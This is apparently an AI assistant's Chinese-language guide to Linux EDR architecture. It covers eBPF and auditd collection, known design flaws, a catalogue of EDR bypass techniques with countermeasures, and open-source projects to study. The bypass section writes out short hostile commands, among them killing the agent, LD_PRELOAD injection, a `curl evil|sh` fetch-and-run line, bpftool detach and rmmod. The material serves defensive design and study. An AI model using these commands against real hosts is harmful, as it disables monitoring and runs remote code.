### Linux 端 EDR（Endpoint Detection & Response）的主流技术栈、实现方式与典型架构问题

Linux 端 EDR 与 Windows EDR 的核心目标一致：持续监控终端行为、检测恶意活动、响应与溯源。但 Linux 环境的多样性（发行版、内核版本、容器、云原生场景）决定了其实现技术与架构权衡明显不同。下面我按“主流技术 → 代表实现 → 常见漏洞/缺陷 → 架构建议”的顺序展开。

### 一、Linux EDR 的核心技术路线

目前市面上稳定商用或成熟开源的 Linux EDR，大体采用以下几类技术组合：

### 1. 内核事件采集：eBPF 正在成为主流

![Sysmon Now Available for Linux: Advanced System Monitoring Tool](https://images.openai.com/static-rsc-4/2sHshsdSET9lr4DIiq2YewTQ7xvUmWePqm_uayTcyXhzJ9gKpKZUfVrosoNjwoJvmf9Jlv-7TdYZPXZ6P1w3KSrWR0z7OCtP6Qzbb4orAnKQOahxrh2Iil0So7QoVCEMZIchwZqIWypfK6GO6IpxEOsQ6z7s9rLAp7pdX1GMeFg00iDjkwM1ipfJ1L6YzPjo?purpose=fullsize)

eBPF（extended Berkeley Packet Filter）允许在内核中安全地运行字节码，对系统调用、网络、文件、进程行为进行低开销观测。

### 典型用途

- 监控 syscall（如 `execve`, `openat`, `connect`, `ptrace`）
- 监控进程创建、文件访问、网络连接
- 采集容器 namespace / cgroup 信息
- 实时策略阻断（部分产品支持）

### 代表产品/项目

Elastic Defend（Elastic Agent）

大量使用 eBPF 做 Linux 行为采集

Falco（CNCF）

云原生运行时安全，基于 eBPF / kernel module

CrowdStrike Falcon Linux Sensor

商用 EDR，近年来也转向 eBPF 优先

Tetragon（Cilium）

Kubernetes/云原生行为检测与执行控制

### 优点

1. 性能开销低（相比 ptrace/auditd）
2. 对容器、K8s 场景适配好
3. 可获取丰富上下文（PID、namespace、cgroup、capabilities）

### 缺点/挑战

1. 依赖较新内核（不同发行版兼容性复杂）
2. eBPF 程序验证器限制较多，复杂逻辑需下沉用户态
3. 某些高危行为仍需 LSM 或内核模块配合阻断

### 2. auditd / Netlink 事件采集：传统稳定方案

![The Linux Process Journey — “kauditd” | by Shlomi Boutnaru, Ph.D. | Medium](https://images.openai.com/static-rsc-4/FFf99jR0_IsAMMKs0LNuqVeg1r_kTgg96sUg4vd6YbG7AH0JrV3M3Bz6J5ucEvW7pbRd5AZ2aT_3Zc-XuR4JPw3gsul9zfOWoxJbodqKbOUVoGcZwWS1kynlgPb7HHvpAez8S_pIaP3acDT6L1wt3VOE89w6NH3I-Z6zwjkRFcV6lkoewOngPDUzf4lci2r-?purpose=fullsize)

Linux 内核自带 `auditd` 审计框架，通过 Netlink 向用户态发送事件。很多早期 Linux EDR 都基于它实现。

### 典型用途

- 记录系统调用审计日志
- 监控文件完整性、权限变更、登录行为
- 满足合规（PCI-DSS、等保、SOX）

### 代表产品/项目

- Wazuh / OSSEC：基于 auditd 做 HIDS/EDR 能力扩展
- Auditbeat（Elastic）：采集 auditd 事件并送往 SIEM
- 许多国产 Linux EDR（如深信服、奇安信、安恒等）早期版本也大量依赖 auditd

### 优点

1. 内核原生支持，稳定成熟
2. 兼容性极好（老内核也能用）
3. 适合合规审计场景

### 缺点

1. 事件量巨大，容易丢日志
2. 性能开销明显，高并发场景压力大
3. 上下文信息不如 eBPF 丰富
4. 容器/K8s 场景可见性较差

### 3. 内核模块 / LSM（Linux Security Module）

![Primer to Container Security | Linux Journal](https://images.openai.com/static-rsc-4/OJfa2blfLyLW29DRgXYKw9tOdbbMN_WttXFq5XZRCBvvjrQCFipfmD7lwE7tB_TUSQ8zW2zizeW9tzmz0FY--vh287FtNfBuzmnzHTg80mgn_7y1J_sBQwZ2fhoTIekeDlRQ_EJXB19nL5nAFI49hSMd8EqiDr_5kWZedfuIlg9Mh5oqr9NRCRcJ7YGh-brl?purpose=fullsize)

一些高防护级 EDR 会加载内核模块或利用 LSM Hook（如 SELinux、AppArmor、Landlock、BPF LSM）实现更强的阻断能力。

### 典型用途

- 阻止恶意进程执行
- 限制文件访问、提权行为
- 实现自保护（防止 EDR 被卸载）

### 代表产品

- SentinelOne Linux Agent
- Trend Micro Deep Security / Vision One
- Microsoft Defender for Endpoint for Linux（部分能力依赖内核扩展）

### 优点

1. 阻断能力强，可做真正的“防御”
2. 可实现进程/文件级强制控制

### 缺点

1. 内核模块兼容性和稳定性风险高
2. 升级内核容易导致 agent 崩溃或失效
3. 某些发行版（如 Ubuntu Secure Boot）对未签名模块有限制

### 4. 用户态行为分析 + 威胁情报

![How SIEM, TIP, UEBA, and SOAR work together for security | G M Faruk Ahmed, CISSP, CISA posted on the topic | LinkedIn](https://images.openai.com/static-rsc-4/LenLzJNK4f3QmM5_w489yw0OoCaOLy9tPVccEmdqAUroJfzylt6uBIAJJT7Ig-BVOjKVP3EhbaUtg8oLIvK20H5JPQN5Wdly4-SYZaf83VSTnlyHeE1Qpj9INmFSPd9XE7X2n_ltxm6tNRKljn1VDGb6CuT6MwMSRBoEHu7L5-ivPhjGyZIHtO8DvPpVH4MP?purpose=fullsize)

采集只是第一步，真正的 EDR 价值在于分析。主流产品都会在用户态做：

- 规则引擎（Sigma、YARA、Falco rules）
- 异常行为建模（机器学习/基线分析）
- 威胁情报匹配（IOC、恶意 IP/域名、Hash）
- 进程树与攻击链还原（ATT&CK 映射）

### 代表实现

- Elastic Security：EQL + ML + ATT&CK
- CrowdStrike Falcon：云端行为分析
- Wazuh：规则 + FIM + SIEM 联动
- Falco：实时规则匹配（更偏运行时安全）

### 二、主流 Linux EDR 的实现架构（简化版）

![Applying Endpoint Detection & Response Solutions within a TELCO Environment](https://images.openai.com/static-rsc-4/TN_WzgiwNIiQ1aNASBE9ve8erbgLeDwfqSvoKyDvxUzCI3HbcSwy8SdrZ4CE_vjYEdGOrKIWArL4QjY1t8yoNVbK32UKbSZsSxg2B6xzTFFVVCh0GEusyBWcaKktSjNblyuH-cJs7zXDSxfl0yndObBZ4zQfIBqa58ArfKV_7zmNANpnIgSbAbwb1i5Afs28?purpose=fullsize)

### 典型数据链路

1. 内核层采集

   eBPF / auditd / LSM Hook 捕获事件

2. 本地 Agent 聚合

   事件去重、缓存、压缩、上下文补全（用户名、容器名、SHA256 等）

3. 策略与阻断

   本地缓存策略，支持离线阻断

4. 消息传输

   TLS + 队列（Kafka/gRPC/HTTP2）发送到云端或管理中心

5. 后端分析

   规则引擎、威胁情报、关联分析、告警生成

6. 控制台响应

   隔离主机、杀进程、下发规则、取证回传

### 关键设计点

- 本地缓存与断网能力

  企业内网经常断连，成熟 EDR 都会做本地队列和断点续传。

- 事件去重与采样

  Linux 上 `execve`、`openat` 频率极高，不做去重会把后端打爆。

- 容器感知

  现代 EDR 必须识别 container ID、pod、namespace，否则在 K8s 中几乎无法定位问题。

- 自保护

  防止恶意软件 kill agent、卸载服务、篡改配置。

### 三、曾暴露出的典型漏洞与架构缺陷

这部分非常关键。Linux EDR 并不是“装上就安全”，很多产品在实现上踩过坑。

### 1. 内核模块导致的系统稳定性问题（高频）

### 现象

- 内核 panic
- 死锁
- 文件系统卡死
- CPU 飙高
- 与第三方驱动冲突（如 Docker、NVIDIA、存储驱动）

### 原因

- 内核 Hook 处理不当
- 不同内核版本结构体变化（ABI 不稳定）
- 并发与锁设计问题

### 案例类型

- 某些早期 Linux EDR 在 `execve` Hook 中做同步网络请求，导致系统卡顿。
- 部分安全产品在升级内核后模块未适配，导致 agent 无法启动或直接触发 kernel oops。

### 经验教训

- 尽量避免重度内核模块，优先 eBPF。
- 阻断逻辑应最小化，复杂分析放用户态。
- 必须建立“内核版本兼容矩阵”。

### 2. auditd 架构的日志洪泛与丢失问题

### 现象

- 高并发服务器（如 Nginx、数据库）产生海量审计日志
- audit backlog 满后开始丢事件
- EDR 后端 Kafka/ES 被打满

### 根因

- auditd 是“全量事件”思维，不适合所有 syscall 都采集
- 缺少动态采样与过滤
- 后端容量规划不足

### 典型缺陷

- 默认开启过多 audit rule（如所有文件访问）
- 没有按业务场景分级采集
- 未做本地限流

### 改进建议

- 只采集高价值事件：`execve`, `setuid`, `ptrace`, `chmod`, `connect` 等
- 引入 eBPF 做前置过滤
- 后端使用 Kafka + ClickHouse/ES 做弹性缓冲

### 3. eBPF 程序绕过与可见性盲区

### 现象

攻击者通过以下方式绕过监控：

- 直接调用较少见 syscall
- 利用静态链接二进制绕过用户态 Hook
- 在容器中利用 namespace 隔离隐藏行为
- 使用内核漏洞提权后禁用 eBPF 程序

### 根因

- 仅监控常见 syscall
- 缺乏 LSM 层强制控制
- Agent 自保护不足

### 改进建议

- eBPF + LSM 联合使用（如 BPF LSM）
- 监控 `bpf()`、`init_module()`、`finit_module()` 等敏感 syscall
- 对 agent 进程启用 immutable、自保护和 watchdog

### 4. 云端依赖过重导致“离线失明”

### 现象

一些 SaaS EDR 在断网时几乎只剩采集功能，无法做本地检测与阻断。

### 根因

- 规则完全云端化
- 本地 agent 只做数据转发
- 没有离线 IOC/规则缓存

### 风险

APT 或内网横向移动时，攻击者往往先断开主机外联。此时 EDR 失效。

### 成熟产品的做法

- 本地缓存 IOC 与规则
- 本地实时检测（YARA/Sigma/Falco rules）
- 断网期间继续阻断，联网后再回传事件

### 5. 容器/Kubernetes 场景考虑不足（近年最常见）

### 典型问题

1. 只能看到宿主机 PID，看不到 Pod 信息
2. 容器短生命周期导致进程树断裂
3. Sidecar/DaemonSet 权限设计不当，成为攻击面
4. 未区分 hostPID、privileged 容器，误报严重

### 案例

很多传统 Linux EDR 直接复用物理机方案，放到 K8s 后告警不可用：

- “/usr/bin/bash 被执行”——但不知道是哪个 Pod
- 容器销毁后上下文丢失，无法溯源

### 改进建议

- 采集 cgroup v2、container ID、Pod/Namespace 标签
- 与 Kubernetes API 做元数据关联
- 使用 DaemonSet + eBPF 的云原生架构（Falco/Tetragon 是典型）

### 四、几类代表性产品/方案对比（技术视角）

| 方案                            | 内核采集           | 阻断能力     | 云原生支持 | 典型优缺点                                 |
| ------------------------------- | ------------------ | ------------ | ---------- | ------------------------------------------ |
| CrowdStrike Falcon              | eBPF + 内核扩展    | 强           | 较好       | 检测强，但 SaaS 依赖较重                   |
| Microsoft Defender for Endpoint | eBPF/内核扩展      | 中强         | 一般       | 与微软生态集成好，Linux 深度略弱于 Windows |
| Elastic Defend                  | eBPF               | 中           | 好         | 可观测性强，适合 SIEM 联动                 |
| Falco                           | eBPF/Kernel module | 弱（偏检测） | 极好       | 云原生最佳之一，但不是完整 EDR             |
| Wazuh                           | auditd             | 弱           | 一般       | 开源易用，性能与实时性一般                 |
| Tetragon                        | eBPF               | 中强         | 极好       | K8s 场景优秀，企业功能仍在完善             |

### 五、如果你要自研 Linux EDR，推荐的现代化架构

结合你前面提到的 Go + ClickHouse + Trace API 方向，其实很适合做“轻量云原生 EDR”。

### 推荐技术栈

| 层级     | 推荐方案                    |
| -------- | --------------------------- |
| 内核采集 | eBPF（libbpf + CO-RE）      |
| Agent    | Go + cgo/libbpfgo           |
| 事件总线 | gRPC / NATS / Kafka         |
| 存储     | ClickHouse（时序+行为日志） |
| 规则引擎 | OPA(Rego) + Sigma 转换      |
| 前端     | React + ECharts             |

### 关键设计建议

### 1. 采集层：只抓高价值事件

- `execve`：进程执行
- `connect`：外联行为
- `openat`：敏感文件访问（仅白名单路径）
- `setuid/setgid`：提权行为
- `ptrace`：调试/注入
- `bpf/init_module/finit_module`：内核操作

### 2. 本地缓存与限流必须做

- 环形缓冲区（ring buffer）读取 eBPF 事件
- 本地 WAL（Write-Ahead Log）防丢失
- 按事件类型限流与聚合

### 3. 容器元数据是第一等公民

事件结构建议至少包含：

### 4. 检测引擎建议“本地 + 云端双层”

1. 本地实时规则：阻断高危行为（反弹 shell、恶意下载、提权）
2. 云端关联分析：横向移动、长期潜伏、威胁情报关联

### 5. 自保护不要过度依赖内核模块

可以先做：

- systemd watchdog
- 只读配置
- 进程守护
- 签名更新
- 限制非 root 用户 kill agent

而不是一开始就上复杂内核自保护。

### 六、总结：Linux EDR 的现实取舍

### 当前行业趋势

1. eBPF 已成为 Linux EDR 的主流采集技术

   相比 auditd 和传统内核模块，它在性能、容器可见性和可维护性上更优。

2. 完整 EDR 不能只做采集

   真正有价值的是：本地检测、云端关联、容器上下文、响应编排。

3. 最大的坑不在“检测率”，而在“工程稳定性”

   很多项目失败于：

   - 日志洪泛
   - 内核兼容
   - 容器场景失真
   - 断网失效
   - 后端存储爆炸

### 一句话建议

如果你是想 研究或自研 Linux EDR，我会建议：优先采用 eBPF + Go Agent + ClickHouse + 本地规则引擎 的云原生架构，避免重度内核模块，重点解决容器上下文、事件限流和离线能力。这条路线基本也是近几年成熟产品演进的方向。

### 如果你愿意，我还能继续给你：

1. Linux EDR 事件模型设计（protobuf / JSON schema）
2. eBPF 采集 execve/connect 的最小实现（Go + libbpfgo）
3. Falco / Tetragon / Elastic Defend 的深入技术对比
4. Linux EDR 常见绕过手法与对抗设计
5. 基于 ClickHouse 的 EDR 日志表结构与查询优化方案









如果从攻防视角看，Linux EDR 的绕过大致分为五层：

```text
        ┌───────────────────┐
        │   云端分析层      │
        ├───────────────────┤
        │   Agent用户态     │
        ├───────────────────┤
        │  eBPF/Audit层     │
        ├───────────────────┤
        │   Kernel层        │
        ├───────────────────┤
        │   Hardware层      │
        └───────────────────┘
```

攻击者通常优先攻击最上层，因为成本最低。

------

# 一、Agent 层绕过（最常见）

这是现实中遇到最多的情况。

## 1. Kill Agent

例如：

```bash
pkill edr-agent
kill -9 <pid>
systemctl stop edr
```

很多国产 EDR 早期都存在这种问题。

### 对抗

systemd watchdog

```ini
Restart=always
RestartSec=1
```

双进程守护

```text
watchdog
    ↓
agent
```

进程死亡立即拉起。

------

## 2. 修改配置

例如：

```bash
vim /etc/edr/config.yaml
```

关闭某些规则：

```yaml
disable:
  - process_monitor
```

### 对抗

配置签名

```text
config.yaml
config.sig
```

启动时验签。

或者：

```bash
chattr +i config.yaml
```

防篡改。

------

## 3. LD_PRELOAD 绕过

很多轻量级 Agent 会 Hook：

```c
execve()
open()
connect()
```

攻击者：

```bash
LD_PRELOAD=/tmp/evil.so
```

覆盖 Hook。

### 对抗

不要依赖：

```text
LD_PRELOAD
ptrace
uprobes-only
```

必须以内核采集为主。

------

# 二、eBPF 层绕过

目前 Linux EDR 最关注的问题。

------

## 1. syscall 盲区

很多产品只监控：

```c
execve
connect
open
```

攻击者换 syscall。

例如：

```c
execveat()
```

或者：

```c
clone3()
```

很多旧规则漏掉。

------

### 对抗

覆盖 syscall 家族：

```text
execve
execveat

open
openat
openat2

clone
clone3

mount
fsmount
move_mount
```

不能只监控经典 syscall。

------

## 2. 静态链接程序

部分 EDR：

```text
uprobes -> libc
```

监控：

```c
libc::execve()
```

攻击者：

```bash
gcc -static
```

直接 syscall。

完全绕过。

------

### 对抗

Hook syscall tracepoint：

```text
tracepoint/syscalls/*
```

而不是 libc。

------

## 3. Ring Buffer Flood

经典攻击。

疯狂制造事件：

```bash
for i in {1..1000000}
do
    touch file$i
done
```

导致：

```text
BPF RingBuffer Full
```

丢事件。

------

### 对抗

多级缓存：

```text
BPF RingBuffer
        ↓
Agent Queue
        ↓
WAL
        ↓
Backend
```

并记录：

```text
drop_count
```

否则管理员都不知道丢数据了。

------

# 三、容器绕过

云原生环境最常见。

------

## 1. Namespace 混淆

如果 EDR 只记录：

```text
PID=1234
```

攻击者：

```bash
docker run
```

容器内：

```text
PID=1
```

宿主：

```text
PID=1234
```

无法关联。

------

### 对抗

事件必须包含：

```json
{
  "pid":1234,
  "container_id":"...",
  "pod":"...",
  "namespace":"..."
}
```

------

## 2. 短生命周期容器

攻击：

```bash
docker run --rm alpine \
    sh -c "curl evil|sh"
```

2 秒结束。

很多 EDR 来不及关联。

------

### 对抗

execve 发生时立即快照：

```text
Container Metadata Cache
```

不要事后查询 K8s API。

------

## 3. Privileged Container

攻击者获得：

```yaml
privileged: true
```

然后：

```bash
mount /dev/sda
```

或者：

```bash
nsenter
```

进入 Host。

------

### 对抗

监控：

```text
CAP_SYS_ADMIN
CAP_SYS_MODULE
CAP_BPF
```

高危能力获取。

------

# 四、Kernel层绕过

这是真正高级攻击者的领域。

------

## 1. 卸载 eBPF Program

如果拥有 root：

```bash
bpftool prog show
bpftool prog detach
```

或者：

```bash
bpftool prog pin rm
```

直接移除探针。

------

### 对抗

监控：

```text
bpf()
```

syscall。

特别是：

```c
BPF_PROG_DETACH
BPF_LINK_DETACH
```

------

## 2. 卸载内核模块

例如：

```bash
rmmod edr
```

------

### 对抗

监控：

```c
delete_module()
```

和：

```c
finit_module()
```

------

## 3. Rootkit

攻击者获得内核执行。

修改：

```c
sys_call_table
```

或者：

```c
ftrace
```

隐藏进程。

此时很多 EDR 已经失明。

------

### 对抗

完整性校验：

比较：

```text
/proc
```

与：

```text
task list
```

结果。

发现隐藏进程。

类似：

Rootkit Hunter

chkrootkit

的思路。

------

# 五、EDR 自身利用

很多 EDR 被攻击的根源。

------

## 1. Agent 提权漏洞

现实案例非常多。

Agent：

```text
root权限运行
开放本地socket
```

攻击者：

```bash
curl localhost:9000
```

构造请求。

直接 root。

------

### 常见原因

Go HTTP API：

```go
http.ListenAndServe(":9000")
```

未鉴权。

或者：

```go
grpc insecure
```

------

### 对抗

本地控制面：

```text
Unix Domain Socket
```

不要 TCP。

------

## 2. 命令执行漏洞

很多产品支持：

```text
远程响应
远程脚本
```

例如：

```json
{
  "action":"run",
  "cmd":"..."
}
```

实现：

```go
exec.Command("sh","-c",userInput)
```

直接 RCE。

------

### 对抗

不要：

```bash
sh -c
```

改：

```go
exec.Command(binary,args...)
```

------

## 3. 更新链路劫持

Agent：

```text
download update.tar.gz
```

如果：

```text
HTTP
```

或者：

```text
仅校验SHA
```

攻击者可替换更新包。

------

### 对抗

必须：

```text
TLS
Code Signing
```

双重校验。

------

# 六、APT级绕过（高级）

现实中较少见。

------

## 1. Living off the Land

不下载恶意文件。

只使用：

```bash
bash
curl
python
ssh
scp
systemctl
```

执行攻击。

没有 IOC。

------

### 对抗

关注：

```text
行为链
```

而非：

```text
文件特征
```

例如：

```text
curl
 ↓
bash
 ↓
ssh
 ↓
systemctl
```

形成攻击图谱。

------

## 2. eBPF Disable Attack

攻击：

```bash
echo 0 > /proc/sys/kernel/unprivileged_bpf_disabled
```

或者利用内核漏洞。

让 EDR 的 eBPF 失效。

------

### 对抗

监控：

```text
sysctl变化
```

以及：

```text
BPF Program数量变化
```

------

## 3. Direct Kernel Object Manipulation（DKOM）

修改：

```c
task_struct
cred
```

隐藏：

```text
进程
网络连接
文件
```

这是 Rootkit 经典玩法。

------

### 对抗

跨源校验：

```text
eBPF结果
VS
procfs结果
VS
内核遍历结果
```

------

# 如果是你正在设计基于 eBPF + Go + ClickHouse 的 Linux EDR

我会优先防御下面这些现实攻击（覆盖约 90% 实战）：

```text
[优先级 P0]

execve/execveat
connect
ptrace
setuid
sudo
cron
systemd service

[优先级 P1]

bpf syscall
init_module
finit_module
delete_module

[优先级 P2]

container escape
namespace enter
CAP_SYS_ADMIN

[优先级 P3]

rootkit
DKOM
kernel exploit
```

并且架构上增加三类专门事件：

```json
{
  "type":"edr_self_protection"
}
{
  "type":"sensor_health"
}
{
  "type":"sensor_tamper"
}
```

很多自研 EDR 能检测攻击，却检测不到“自己正在被攻击”，这是最容易被忽略的设计缺陷之一。





如果你的目标不是简单部署 EDR，而是**研究 Linux EDR 技术架构并准备自研**，我建议不要只看一个项目，而是拆解几个项目学习其最优秀的部分。

我会按「值得抄作业的程度」排序。

------

# 第一梯队（强烈推荐深入研究）

## Tetragon

项目主页：

[Tetragon GitHub](https://github.com/cilium/tetragon?utm_source=chatgpt.com)

------

### 最值得学习

Tetragon 是目前最接近现代 Linux EDR 架构的开源项目。

它解决了很多老 EDR 没解决的问题：

```text
eBPF CO-RE
LSM Hook
Container Metadata
Kubernetes Context
Policy Enforcement
```

其架构大致：

```text
Kernel
  ↓
eBPF
  ↓
Event Cache
  ↓
TracingPolicy
  ↓
Export
```

------

### 建议重点阅读

#### Process Tracking

源码目录：

```text
pkg/process/
```

学习：

```text
execve关联
父子进程树
容器上下文
```

------

#### Policy Engine

```text
pkg/sensors/tracing
```

学习：

```text
事件过滤
策略下沉
内核侧过滤
```

------

#### LSM Enforcement

学习：

```text
security_bprm_check
security_file_open
```

这些 Hook 如何实现阻断。

------

### 为什么值得研究

如果你未来想做：

```text
Go Agent
+
eBPF
+
ClickHouse
```

Tetragon 是最接近的参考。它通过 eBPF 和 LSM 实现监控与执行控制，属于现代运行时安全架构。([Decryption Digest](https://www.decryptiondigest.com/blog/ebpf-runtime-security-tools-falco-tetragon?utm_source=chatgpt.com))

------

# 第二梯队

## Falco

项目主页：

[Falco GitHub](https://github.com/falcosecurity/falco?utm_source=chatgpt.com)

------

### 最值得学习

Falco 最大价值不是采集。

而是：

```text
Rule Engine
Detection Logic
Threat Modeling
```

------

Falco 的规则：

```yaml
- rule: Reverse shell
```

本质类似：

```text
Sigma
YARA
ATT&CK
```

结合体。

------

### 建议重点看

规则目录：

```text
rules/
```

你会发现：

```text
反弹Shell
容器逃逸
提权
敏感文件访问
```

基本都有成熟检测思路。

------

### Falco 的缺点

它本身更偏：

```text
Runtime IDS
```

不是完整 EDR。

告警很强。

响应较弱。

大量用户反馈真正的挑战是规则调优和告警降噪，而不是部署本身。([Nova AI Ops](https://novaaiops.com/blog/falco-vs-tetragon-runtime-security-compared?utm_source=chatgpt.com))

------

# 第三梯队

## Tracee

项目主页：

[Tracee GitHub](https://github.com/aquasecurity/tracee?utm_source=chatgpt.com)

------

### 最值得学习

Tracee 的定位非常特殊：

```text
Detection
+
Forensics
+
Threat Hunting
```

------

它关注：

```text
syscall
capability
kernel exploit
container escape
```

比 Falco 更接近安全研究员视角。

------

### 适合研究

如果你以后想实现：

```text
Attack Graph
Threat Hunting
Timeline
```

Tracee 的事件设计很值得看。

很多安全分析师认为它在取证和深度可观测性方面优于传统 HIDS。([Decryption Digest](https://www.decryptiondigest.com/blog/ebpf-runtime-security-tools-falco-tetragon?utm_source=chatgpt.com))

------

# 第四梯队

## osquery

项目主页：

[osquery GitHub](https://github.com/osquery/osquery?utm_source=chatgpt.com)

------

很多人第一次看：

```text
SELECT * FROM processes;
```

会觉得这不是 EDR。

其实很多商业 EDR 内部都借鉴了它。

------

### 最值得学习

统一数据模型。

例如：

```sql
select * from process_events
select * from listening_ports
select * from users
```

------

本质上是在做：

```text
Host Telemetry Abstraction
```

------

如果你的后端是：

```text
ClickHouse
```

那么 osquery 的 Schema 设计极具参考价值。

------

# 第五梯队

## Wazuh

项目主页：

[Wazuh Official Site](https://wazuh.com/?utm_source=chatgpt.com)

------

### 值得学习什么

不是 Agent。

而是：

```text
Manager
Rule Engine
Correlation
Dashboard
```

------

Wazuh 最大贡献是：

```text
EDR
+
SIEM
+
FIM
+
Compliance
```

整合到一起。

它也是目前开源生态中部署最广泛的 EDR/SIEM 方案之一。([OpenSecAtlas](https://opensecatlas.com/domain/endpoint-security?utm_source=chatgpt.com))

------

# 第六梯队（非常适合你的项目）

## Velociraptor

项目主页：

[Velociraptor Official Site](https://velociraptor.app/?utm_source=chatgpt.com)

------

严格说：

```text
DFIR
```

不是 EDR。

但它有个特点：

```text
Remote Query
Artifact
Collection
```

------

如果你未来做：

```text
Kill Process
Collect File
Collect Memory
Execute Response
```

Velociraptor 是最佳参考之一。

------

# 如果是你当前的技术栈

从你前面给出的架构：

```text
Agent
 ↓
Trace API
 ↓
ClickHouse
 ↓
Go Backend
 ↓
React
```

我会建议直接研究下面几个模块。

| 模块     | 参考项目     |
| -------- | ------------ |
| eBPF采集 | Tetragon     |
| 规则检测 | Falco        |
| 数据模型 | osquery      |
| 威胁狩猎 | Tracee       |
| 响应编排 | Velociraptor |
| 告警关联 | Wazuh        |

------

# 最值得抄的三个源码目录

如果时间有限，我只看这三个：

### ① Tetragon

```text
pkg/process
pkg/sensors
pkg/grpc
```

学习：

```text
execve事件关联
容器上下文
eBPF事件管线
```

------

### ② Falco

```text
rules/
userspace/engine
```

学习：

```text
规则引擎
检测逻辑
ATT&CK映射
```

------

### ③ osquery

```text
osquery/tables
```

学习：

```text
统一主机数据模型
```

------

如果目标是做一个类似你前面描述的 **Go + eBPF + ClickHouse + OPA 的 Linux EDR**，我会认为：

```text
Tetragon 负责告诉你怎么采集
Falco 负责告诉你怎么检测
osquery 负责告诉你怎么建模
Velociraptor 负责告诉你怎么响应
```

把这四者融合起来，基本就是目前主流 Linux EDR/XDR 产品的核心技术路线。

------

# 本项目（EDR）的 rootkit 检测映射

> 更新时间：2026-06-17 | 对应版本：v0.7 rootkit 检测插队项

基于上文的五维狩猎面，本项目在 v0.7 的实施方案映射如下：

| 维度 | Ring0 攻击者改什么 | 本项目检测手段 | 响应动作 |
|------|-------------------|---------------|---------|
| 文件 | hook getdents 过滤目录项 | P2 延后（getdents 跨视图对比） | — |
| 进程 | DKOM 摘链 task_struct | `/proc` 遍历 vs BPF 观测 PID 集合 | `kill` |
| 网络 | hook tcp4_seq_show 等 | P1 可选（ConnTracker vs `/proc/net/tcp`） | `network_isolate` |
| 模块 | 从 lsmod 链表移除 | `/sys/module/` vs `/proc/modules` 跨源校验 | `network_isolate` |
| 系统调用 | ftrace / syscall table hook | P2/P3 延后（行为-日志矛盾检测） | — |

另外通过新增 eBPF tracepoint 探针主动监控：

- `init_module` / `finit_module` / `delete_module` → 检测 LKM rootkit 加载/卸载
- `bpf()` syscall → 检测 eBPF rootkit 加载或探针卸载

响应策略：默认 monitor，演习前可切 enforce；enforce 时优先 `network_isolate`，必要时 `kill`。
